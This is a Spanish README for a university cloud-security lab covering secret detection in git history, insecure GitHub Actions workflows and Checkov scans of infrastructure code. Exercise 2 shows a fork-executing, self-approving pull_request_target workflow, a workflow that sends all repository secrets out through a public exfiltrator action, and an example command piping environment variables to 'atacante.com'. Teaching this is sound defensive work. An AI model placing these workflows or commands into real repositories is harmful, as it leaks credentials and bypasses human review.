# UAX Seguridad en la Nube — Seguridad en Pipelines y en configuraciones de la nube.

Contiene tres ejercicios progresivos que cubren detección de secretos, malas configuraciones en workflows y análisis estático de infraestructura como código.

---

## Ejercicio 1 — Detección de secretos en el repositorio

**Objetivo:** demostrar que los secretos hardcodeados en el código (incluso ofuscados en base64) son detectables con herramientas automatizadas, y que el historial de git los expone indefinidamente aunque se borren posteriormente.

El commit `eb5ea21` introdujo un secreto (`CUPON-SECRETO-UAX-2026`) en `index.html`, tanto en texto plano como codificado en base64. Aunque el commit fue corregido, el historial git lo conserva y cualquier herramienta de escaneo puede recuperarlo.

### Herramientas utilizadas

| Herramienta | Modo | Resultado |
|---|---|---|
| [HackTricks GitHub Leaks](https://tools.hacktricks.wiki/github-leaks/index.html) | Online (sin instalación) | Detectó 2 secretos + decodificó el base64 |
| Gitleaks | Local | Detectó 4 hallazgos, decodificó base64 automáticamente |
| TruffleHog | Local | No detectó nada (solo detecta tokens conocidos y los verifica contra APIs) |

### Hallazgos de Gitleaks

```bash
# Escanear historial git completo
gitleaks detect --source .

# Exportar resultados
gitleaks detect --source . --report-format json --report-path resultado.json
```

Gitleaks encontró el secreto tanto en su forma base64 (`Q1VQT04tU0VDUkVUTy1VQVgtMjAyNg==`) como decodificado (`CUPON-SECRETO-UAX-2026`), con el tag `decoded:base64`.

### Conclusión

- El historial de git es permanente: borrar el secreto en un commit nuevo no lo elimina del pasado.
- Gitleaks detecta secretos custom por entropía y también decodifica base64.
- TruffleHog es más preciso para tokens de servicios conocidos (GitHub, AWS…), pero no detecta secretos arbitrarios.

> Ver análisis completo en [`analisis-secretos.md`](analisis-secretos.md)

---

## Ejercicio 2 — Malas configuraciones en GitHub Actions

**Objetivo:** identificar dos vulnerabilidades críticas en workflows de GitHub Actions que pueden comprometer la seguridad del repositorio y sus secretos.

### Mala configuración 1 — Auto-aprobación de PRs + `pull_request_target`

**Archivo:** `.github/workflows/deploy.yml`

```yaml
name: PR Check

on:
  pull_request_target:       # ejecuta en contexto del repo base, con acceso a secretos
    types: [opened, synchronize]

jobs:
  check:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - name: Checkout código del PR
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ejecuta código del fork

      - name: Aprobar PR automáticamente
        run: |
          gh pr review ${{ github.event.pull_request.number }} \
            --approve \
            --body "✅ Validación automática superada."
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Por qué es peligroso:**

Combina dos problemas. Por un lado, `pull_request_target` ejecuta el workflow en el contexto del repositorio base, con acceso a sus secretos. Luego hace checkout del código del fork y lo ejecuta — esto se conoce como **Poisoned Pipeline Execution (PPE)** o **Pwn Request**. Un atacante puede explotar esto así:

1. Hace fork del repositorio y crea una rama con código malicioso (ej. un script que vuelca `env | curl https://atacante.com --data-binary @-`).
2. Abre un PR desde su fork hacia el repo original.
3. El workflow se dispara con `pull_request_target` — el código del atacante se ejecuta **con acceso a los secretos del repo base**.
4. Los secretos llegan al servidor del atacante. El `GITHUB_TOKEN`, claves de deploy, credenciales cloud... todo lo que esté en el entorno.

Por otro lado, auto-aprueba el PR con el `GITHUB_TOKEN`. Para que funcione, el repositorio debe tener activado **Settings → Actions → "Allow GitHub Actions to create and approve pull requests"**. El riesgo depende de la configuración de branch protection:

| Configuración | Riesgo |
|---|---|
| Sin branch protection | Cualquier PR se fusiona sin revisión humana |
| Branch protection con 1 revisor requerido | La aprobación del `GITHUB_TOKEN` **cuenta como esa revisión** — ningún humano revisa el código |
| Branch protection con ≥ 2 revisores requeridos | La auto-aprobación no es suficiente — sigue requiriendo al menos 1 revisor humano |

**Solución:**
1. Reemplazar `pull_request_target` por `pull_request` para eliminar el acceso a secretos desde forks.
2. Desactivar "Allow GitHub Actions to create and approve pull requests" en Settings del repositorio.
3. Exigir **≥ 2 revisores** en branch protection para que la aprobación automática no sea suficiente.

---

### Mala configuración 2 — Exfiltración de secretos via action maliciosa

> Este workflow lo tenéis en el historial de cambios y de las acciones ejecutadas.

```yaml
name: Conseguir los secretos

on: push

jobs:
  exfil:
    runs-on: ubuntu-latest
    name: Esto conseguirá los secretos de GitHub Actions gracias a la acción de Offensive Actions
    steps:
      - uses: offensive-actions/secret-env-exfiltrator@main
        with:
          vars: ${{ toJSON(vars) }}
          secrets: ${{ toJSON(secrets) }}
```

**Qué hace este workflow:**

Utiliza la action pública [`offensive-actions/secret-env-exfiltrator`](https://github.com/offensive-actions/secret-env-exfiltrator) para volcar todos los secretos y variables del repositorio serializados en JSON y enviarlos a un servidor externo. Se dispara en cada `push`, por lo que se ejecuta silenciosamente en cada commit.

**Por qué es peligroso:**

- `${{ toJSON(secrets) }}` serializa **todos los secretos** del repositorio de una vez (tokens de deploy, claves de API, credenciales cloud…).
- GitHub enmascara secretos en los logs (`***`), pero la action los recibe como variables de entorno antes del enmascaramiento y puede exfiltrarlos por cualquier canal de red.
- Al referenciar `@main` en lugar de un SHA fijo, el código ejecutado puede cambiar en cualquier momento sin que el repositorio lo detecte.

---

## Ejercicio 3 — Análisis de infraestructura con Checkov

**Objetivo:** usar Checkov para detectar malas configuraciones de seguridad en infraestructura como código (Terraform, Kubernetes, Dockerfile y GitHub Actions) antes de desplegar en producción.

### ¿Qué es Checkov?

Herramienta de análisis estático open-source para IaC (mantenida por Prisma Cloud / Palo Alto Networks). Detecta malas configuraciones en Terraform, Dockerfiles, Kubernetes, GitHub Actions, CloudFormation y más. Cada check tiene un ID único (`CKV_AWS_24`) y enlaza con documentación de remediación.

```bash
pip3 install checkov

# Escanear directorio completo
checkov -d .

# Exportar resultados
checkov -d . --output json > resultados.json
```

### Resultados del escaneo

| Archivo | Pasados | Fallos |
|---|---|---|
| `main.tf` (Terraform) | 11 | 44 |
| `kubernetes.yaml` | 71 | 26 |
| `Dockerfile` | 58 | 4 |
| GitHub Actions | 0 | 8 |
| **TOTAL** | **140** | **82** |

**82 checks fallidos** sobre 222 comprobaciones (36.9% de fallos).

### Vulnerabilidades más críticas detectadas

**Terraform:**
- S3 con ACL pública de lectura y escritura (`CKV_AWS_20`, `CKV_AWS_57`)
- EC2 sin IMDSv2 obligatorio — permite SSRF al metadata service (`CKV_AWS_79`) **[CRÍTICO]**
- SSH y RDP abiertos a `0.0.0.0/0` (`CKV_AWS_24`, `CKV_AWS_25`)
- IAM Policy con `Action: "*"` y `Resource: "*"` — privilegios totales (`CKV_AWS_62`)
- RDS accesible públicamente sin cifrado ni backups (`CKV_AWS_17`, `CKV_AWS_16`)

**Dockerfile:**
- Imagen `python:latest` sin tag fijo — riesgo de supply chain (`CKV_DOCKER_7`)
- Aplicación corriendo como root (`CKV_DOCKER_3`)
- Secretos hardcodeados en variables `ENV` (`CKV_DOCKER_4`)

**Kubernetes:**
- Contenedor con `privileged: true` — acceso completo al kernel (`CKV_K8S_6`) **[CRÍTICO]**
- Capability `SYS_ADMIN` habilitada — permite escape del contenedor (`CKV_K8S_28`) **[CRÍTICO]**
- `hostNetwork: true` y `hostPID: true` — acceso a red y procesos del nodo
- Secretos en variables de entorno en texto plano (`CKV_K8S_37`)

**GitHub Actions:**
- `pull_request_target` con checkout del fork (`CKV_GHA_7`) **[CRÍTICO]**
- Actions referenciadas por tag flotante, no por SHA (`CKV_GHA_1`)
- Permisos `write-all` a nivel de workflow (`CKV2_GHA_1`)
- Inyección de comandos via `${{ github.event.pull_request.title }}` (`CKV_GHA_3`)

### Conexión con ataques reales

Los checks fallidos reproducen los vectores usados por TeamPCP en los ataques a Trivy en marzo 2026:

| Check | Vector real |
|---|---|
| `CKV_GHA_7` | `pull_request_target` mal configurado — usado para robar el PAT inicial de Trivy |
| `CKV_GHA_1` | Tags sin pinning — force-push de tags para ejecutar código malicioso en workflows |
| `CKV_AWS_79` | IMDSv2 no obligatorio — SSRF para obtener credenciales cloud desde runners CI |
| `CKV_K8S_6` | Contenedor privilegiado — instalación de backdoors persistentes en nodos |

> Ver análisis completo y archivos corregidos en [`checkov/solucion.md`](checkov/solucion.md)

---

## Estructura del repositorio

```
.
├── .github/
│   └── workflows/
│       └── deploy.yml               # Ejercicio 2 — workflow con exfiltración de secretos
├── checkov/
│   ├── corregidos/
│   │   ├── deploy_fixed.yml         # Ejercicio 3 — workflow corregido
│   │   ├── Dockerfile.fixed         # Ejercicio 3 — Dockerfile corregido
│   │   ├── github-actions_fixed.yml # Ejercicio 3 — actions corregidas
│   │   └── kubernetes_fixed.yaml    # Ejercicio 3 — K8s corregido
│   ├── deploy.yml                   # Ejercicio 3 — workflow vulnerable
│   ├── Dockerfile                   # Ejercicio 3 — Dockerfile vulnerable
│   ├── github-actions.yml           # Ejercicio 3 — actions vulnerables
│   ├── kubernetes.yaml              # Ejercicio 3 — K8s vulnerable
│   └── solucion.md                  # Ejercicio 3 — análisis completo
├── index-corregido.html             # Ejercicio 1 — versión sin secreto
├── analisis-secretos.md             # Ejercicio 1 — análisis completo
└── README.md
```

---

*UAX 2026 — Seguridad en la nube*
